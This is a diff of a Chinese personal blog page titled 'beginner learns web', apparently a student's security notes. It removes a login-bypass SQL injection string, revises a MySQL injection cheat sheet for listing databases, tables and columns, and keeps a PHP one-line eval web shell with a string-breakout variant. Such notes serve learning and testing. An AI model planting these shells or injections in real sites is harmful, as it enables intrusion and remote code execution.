@@ -81,18 +81,18 @@
 
 
 
-<meta name="description" content="密码绕过漏洞:11&apos; or 1 #">
+<meta name="description" content="mysql手工注入:123select schema_name from information_schema.schemata;爆库名select table_name from information_schema.tables where table_schema=&quot;&quot;;爆表名select column_name from information_schema.columns where">
 <meta name="keywords" content="web安全,sql漏洞">
 <meta property="og:type" content="article">
 <meta property="og:title" content="菜鸟初学web">
 <meta property="og:url" content="http://chenxiyuan.vip/2018/10/19/菜鸟初学web/index.html">
 <meta property="og:site_name" content="晨曦远的博客">
-<meta property="og:description" content="密码绕过漏洞:11&apos; or 1 #">
+<meta property="og:description" content="mysql手工注入:123select schema_name from information_schema.schemata;爆库名select table_name from information_schema.tables where table_schema=&quot;&quot;;爆表名select column_name from information_schema.columns where">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-11-02T15:21:13.377Z">
+<meta property="og:updated_time" content="2019-05-07T12:58:49.174Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="菜鸟初学web">
-<meta name="twitter:description" content="密码绕过漏洞:11&apos; or 1 #">
+<meta name="twitter:description" content="mysql手工注入:123select schema_name from information_schema.schemata;爆库名select table_name from information_schema.tables where table_schema=&quot;&quot;;爆表名select column_name from information_schema.columns where">
 
 
 
@@ -344,8 +344,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-11-02T23:21:13+08:00">
-                2018-11-02
+              <time title="更新于" itemprop="dateModified" datetime="2019-05-07T20:58:49+08:00">
+                2019-05-07
               </time>
             
           </span>
@@ -406,7 +406,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  50 字
+                  55 字
                 </span>
               
 
@@ -444,15 +444,12 @@
 
       
         <p><br></p>
-<h2 id="密码绕过漏洞"><a href="#密码绕过漏洞" class="headerlink" title="密码绕过漏洞:"></a>密码绕过漏洞:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
-<p><br><br><a id="more"></a></p>
-<hr>
 <p><br></p>
-<h2 id="mysql手工注入"><a href="#mysql手工注入" class="headerlink" title="mysql手工注入:"></a>mysql手工注入:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">""</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="mysql手工注入"><a href="#mysql手工注入" class="headerlink" title="mysql手工注入:"></a>mysql手工注入:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;爆库名</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">""</span>;爆表名</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">""</span>;爆列名</span><br></pre></td></tr></table></figure>
 <p><br></p>
 <hr>
 <p><br></p>
-<h2 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马:"></a>php一句话木马:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[  <span class="string">'pass'</span>  ]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">"?&gt;&lt;?php @eval($_POST[  'pass'  ]);?&gt;&lt;?php#</span></span><br></pre></td></tr></table></figure>
+<h2 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马:"></a>php一句话木马:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">"?&gt;&lt;?php @eval($_POST[  'pass'  ]);?&gt;&lt;?php#</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -732,7 +729,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#密码绕过漏洞"><span class="nav-number">1.</span> <span class="nav-text">密码绕过漏洞:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql手工注入"><span class="nav-number">2.</span> <span class="nav-text">mysql手工注入:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php一句话木马"><span class="nav-number">3.</span> <span class="nav-text">php一句话木马:</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql手工注入"><span class="nav-number">1.</span> <span class="nav-text">mysql手工注入:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php一句话木马"><span class="nav-number">2.</span> <span class="nav-text">php一句话木马:</span></a></li></ol></div>
             
 
           </div>
@@ -774,7 +771,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">7.1k</span>
+    <span title="Site words total count">7.9k</span>
   
 </div>
 
